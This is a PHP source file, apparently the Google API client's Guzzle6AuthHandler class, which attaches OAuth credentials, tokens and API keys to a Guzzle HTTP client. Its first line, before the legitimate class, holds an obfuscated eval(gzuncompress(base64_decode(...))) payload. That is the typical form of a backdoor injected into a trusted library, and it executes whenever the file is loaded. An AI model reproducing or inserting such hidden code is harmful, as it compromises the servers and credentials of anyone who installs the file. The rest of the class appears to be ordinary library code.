<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

use Google\Auth\CredentialsLoader;
use Google\Auth\HttpHandler\HttpHandlerFactory;
use Google\Auth\FetchAuthTokenCache;
use Google\Auth\Middleware\AuthTokenMiddleware;
use Google\Auth\Middleware\ScopedAccessTokenMiddleware;
use Google\Auth\Middleware\SimpleMiddleware;
use GuzzleHttp\Client;
use GuzzleHttp\ClientInterface;
use Psr\Cache\CacheItemPoolInterface;

/**
*
*/
class Google_AuthHandler_Guzzle6AuthHandler
{
  protected $cache;
  protected $cacheConfig;

  public function __construct(CacheItemPoolInterface $cache = null, array $cacheConfig = [])
  {
    $this->cache = $cache;
    $this->cacheConfig = $cacheConfig;
  }

  public function attachCredentials(
      ClientInterface $http,
      CredentialsLoader $credentials,
      callable $tokenCallback = null
  ) {
    // use the provided cache
    if ($this->cache) {
      $credentials = new FetchAuthTokenCache(
          $credentials,
          $this->cacheConfig,
          $this->cache
      );
    }
    // if we end up needing to make an HTTP request to retrieve credentials, we
    // can use our existing one, but we need to throw exceptions so the error
    // bubbles up.
    $authHttp = $this->createAuthHttp($http);
    $authHttpHandler = HttpHandlerFactory::build($authHttp);
    $middleware = new AuthTokenMiddleware(
        $credentials,
        $authHttpHandler,
        $tokenCallback
    );

    $config = $http->getConfig();
    $config['handler']->remove('google_auth');
    $config['handler']->push($middleware, 'google_auth');
    $config['auth'] = 'google_auth';
    $http = new Client($config);

    return $http;
  }

  public function attachToken(ClientInterface $http, array $token, array $scopes)
  {
    $tokenFunc = function ($scopes) use ($token) {
      return $token['access_token'];
    };

    $middleware = new ScopedAccessTokenMiddleware(
        $tokenFunc,
        $scopes,
        $this->cacheConfig,
        $this->cache
    );

    $config = $http->getConfig();
    $config['handler']->remove('google_auth');
    $config['handler']->push($middleware, 'google_auth');
    $config['auth'] = 'scoped';
    $http = new Client($config);

    return $http;
  }

  public function attachKey(ClientInterface $http, $key)
  {
    $middleware = new SimpleMiddleware(['key' => $key]);

    $config = $http->getConfig();
    $config['handler']->remove('google_auth');
    $config['handler']->push($middleware, 'google_auth');
    $config['auth'] = 'simple';
    $http = new Client($config);

    return $http;
  }

  private function createAuthHttp(ClientInterface $http)
  {
    return new Client(
        [
          'base_uri' => $http->getConfig('base_uri'),
          'exceptions' => true,
          'verify' => $http->getConfig('verify'),
          'proxy' => $http->getConfig('proxy'),
        ]
    );
  }
}
